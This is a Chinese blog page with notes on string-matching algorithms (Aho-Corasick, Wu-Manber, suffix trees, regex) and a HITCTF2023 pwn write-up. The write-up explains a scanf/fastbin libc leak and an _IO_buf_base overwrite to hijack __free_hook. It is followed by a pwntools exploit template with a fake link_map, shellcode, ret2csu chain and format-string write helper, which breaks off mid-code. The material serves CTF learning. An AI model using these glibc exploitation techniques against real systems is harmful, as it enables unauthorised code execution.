<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2024.png" alt="Untitled"></p>
<p>这个压缩更狠一些(</p>
<h3 id="双数组改进方法">双数组改进方法</h3>
<p>转向函数中引入双数组，Base表和Check表。</p>
<p>Base表：当前状态的Base值+ASCII输入 = 下一个状态的偏移。</p>
<p>Check表：当前状态的父状态信息</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>父状态是唯一的</p>
</li>
</ul>
<p>自动机构建是建立在广度优先搜索的基础上。</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2025.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2026.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2027.png" alt="Untitled"></p>
<p>唉唉给图自己理解吧 有一点点复杂</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2028.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2029.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2030.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2031.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2032.png" alt="Untitled"></p>
<h2 id="WM算法-Wu-Manber-快速的多模式匹配算法">WM算法(Wu-Manber)-快速的多模式匹配算法</h2>
<p>采用了跳跃的不可能匹配的字符策略和hash散列的方法，对处理大规模的多关键字匹配问题有很好的效果。有具体使用：agrep</p>
<h3 id="匹配示例">匹配示例</h3>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2033.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2034.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2035.png" alt="Untitled"></p>
<p>算法主要用了几个数据结构：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>SHIFT表</p>
</li>
<li class="lvl-2">
<p>HASH表</p>
</li>
<li class="lvl-2">
<p>PREFIX表</p>
</li>
<li class="lvl-2">
<p>PAT_PTR表</p>
</li>
</ul>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2036.png" alt="Untitled"></p>
<h3 id="预处理过程">预处理过程</h3>
<p><strong>算法的基本思想：在预处理阶段，主要使用了SHIFT表、HASH表和PREFIX表。</strong></p>
<p>在搜索查找阶段，SHIFT表用于在扫描文本串的时候，根据读入字符串可以决定跳过的字符数，如果相应的跳跃值为0，则说明可能发生匹配，就要用到HASH表和PREFIX表进行进一步的判断，以决定有哪些匹配候选模式，并验证究竟哪个或者哪些某选模式完全匹配。</p>
<p>SHIFT表如何构造：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2037.png" alt="Untitled"></p>
<p><strong>有点像坏字符了(</strong></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2038.png" alt="Untitled"></p>
<p>HASH表的构造：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2039.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2040.png" alt="Untitled"></p>
<p>PREFIX表的构造：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2041.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2042.png" alt="Untitled"></p>
<h3 id="有点复杂，看个例图">有点复杂，看个例图</h3>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2043.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2044.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2045.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2046.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2047.png" alt="Untitled"></p>
<p>一般会取B=2/B=3</p>
<p><strong>懂啦！</strong></p>
<p><strong>复杂度分析：</strong></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2048.png" alt="Untitled"></p>
<h1>AC算法和Wu-Manber算法比较</h1>
<p>在模式串个数下对算法性能的比较：</p>
<p>WM完胜</p>
<p>模式串长度下</p>
<p>WM也完胜</p>
<p>原因在于WM算法具有并行性，性能更好。</p>
<h2 id="什么时候用什么">什么时候用什么</h2>
<p>AC并行化</p>
<p>任务并行就是我可以同时将m个模式中k个模式构建一个自动机</p>
<p>m-k个模式构建一个自动机，甚至是建一个wm</p>
<p>不同的数据同时走这两个自动机</p>
<p>这是当一个节点空间构建不了一个所有模式自动机的时候</p>
<p>对于数据并行，可以构建一个自动机，多个线程共用这个自动机，每个线程可以只保存自己的自动机状态，把数据分到每个线程</p>
<p>适合数据量较大的场景</p>
<p>模式不一定很多</p>
<p>就知道这两个就行了</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2049.png" alt="Untitled"></p>
<h2 id="基于AC双数组算法的IP地址匹配">基于AC双数组算法的IP地址匹配</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2050.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2051.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2052.png" alt="Untitled"></p>
<h3 id="最大公共字串问题-LCS问题-longest-common-substring">最大公共字串问题(LCS问题 longest common substring)</h3>
<p>方法：广义后缀树(Generalized Suffix Tree)，简称GST算法。</p>
<p>把给定的N个源字符串的<strong>所有的后缀</strong>建成<strong>一棵树</strong></p>
<p>例子：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2053.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2054.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2055.png" alt="Untitled"></p>
<h2 id="最长公共子序列问题">最长公共子序列问题</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2056.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2057.png" alt="Untitled"></p>
<p><strong>什么算法设计与分析</strong></p>
<h2 id="正则表达式匹配算法">正则表达式匹配算法</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2058.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/1.png" alt="1.png"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/2.png" alt="2.png"></p>
<p>.</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/3.png" alt="3.png"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/4.png" alt="4.png"></p>
<p>C* 表示的是匹配前面的表达式 C 零次或多次</p>
<p>如果你想匹配至少出现一次的 C，可以使用 C+。</p>
<p>d? 表示字符 d 是可选的，可以出现零次或一次。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/26/HITCTF2023-scanf%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/26/HITCTF2023-scanf%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">HITCTF2023 scanf题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-26 21:40:18 / 修改时间：21:41:54" itemprop="dateCreated datePublished" datetime="2023-11-26T21:40:18+08:00">2023-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>magic scanf&amp;&amp;_IO_buf_base</h1>
<h2 id="magic-scanf">magic scanf</h2>
<p>fastbin有一个特性，就是在申请堆块大于smallbin(x64下0x128)的时候会对fastbin进行整理，先放进unsorted bin再送进small bin。</p>
<p>其次scanf读入巨大数据的时候会申请一个堆块来缓存数据，并且读入”+”的时候会跳过用户输入。</p>
<p>拥有上述两个特点之后，就可以实现虽然只有fastbin，但是能leak出libc，这一招可以将fastbin变为smallbin。</p>
<p>根据题目在这之后我们就有了往任意地址上写一个\x00的效果。</p>
<h2 id="IO-buf-base">IO_buf_base</h2>
<p>scanf通过stdin的FILE结构暂存输入流，然后再输入到指定位置。</p>
<p>scanf实现的核心函数是_IO_new_file_underflow</p>
<p>这个函数：</p>
<p><strong>当stdin-&gt;_IO_read_ptr大于等于stdin-&gt;_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin-&gt;_IO_buf_base处读入stdin-&gt;_IO_buf_end - stdin-&gt;_IO_buf_base个字节，然后更新stdin-&gt;_IO_read_end的值</strong></p>
<p>所以我们可以通过修改_IO_buf_base的末尾为\x00，实现对_IO_2_1_stdin_的部分修改，然后改为我们指定的地方，实现任意地址写。</p>
<p>不过要注意缓冲区_IO_read_ptr和_IO_read_end的情况。</p>
<p>在scanf检测到输入不合规则的时候，会将数据丢弃到缓冲区中，也就是_IO_read_ptr那里，所以我们需要getchar()清空缓冲区再进行第二次的任意地址写。</p>
<p>题目来自HITCTF2023 scanf</p>
<p>在申请巨大堆块时，malloc会先整理fastbin，放到smallbin里面，然后就可以从fd中读出一个libc地址</p>
<p><strong>劫持 _IO_FILE 结构体的 _IO_buf_base 和_IO_buf_end 实现任意地址写</strong></p>
<p>第一次改buf_base末尾为\x00，可以控制部分_IO_2_1_stdin_</p>
<p>读的不符合scanf规范，会进入read的缓冲区，需要getchar清空一下</p>
<p>再通过控制buf_base和buf_end来写free_hook为onegadget就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;/home/hkbin/Desktop/CTF/tools/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;47.97.96.29&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;51907&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">mode = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>): <span class="comment"># fake_linkmap_addr指向一段可控内存 | known_func_ptr指向一个已知的函数的got表地址 | offset是system函数和这个函数在libc上的偏移</span></span><br><span class="line">    <span class="comment"># &amp;(2**64-1)是因为offset通常为负数，如果不控制范围，p64后会越界，发生错误</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment">#l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># 可以为任意值</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>) <span class="comment"># 这里的值就是伪造的.rel.plt的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项</span></span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) <span class="comment"># Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 </span></span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) <span class="comment"># Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment"># Rela-&gt;r_addend,任意值都行</span></span><br><span class="line"></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)<span class="comment">#l_ns</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) <span class="comment"># 参考IDA上.dyamisc的结构</span></span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) <span class="comment"># 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8</span></span><br><span class="line"></span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) <span class="comment"># fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) <span class="comment"># fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>) <span class="comment"># fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_shellcode</span>():</span><br><span class="line">    payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0</span>, arg2 = <span class="number">0</span>, arg3 = <span class="number">0</span></span>): <span class="comment"># -&gt;可能需要具体问题具体分析</span></span><br><span class="line">    payload = p64(part1)    <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)    <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)    <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(part2)    <span class="comment"># part2 entry will call [r12 + rbx * 0x8]</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">56</span>    <span class="comment"># junk 6 * 8 + 8 = 56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">8</span></span><br><span class="line">    sa(prefix, <span 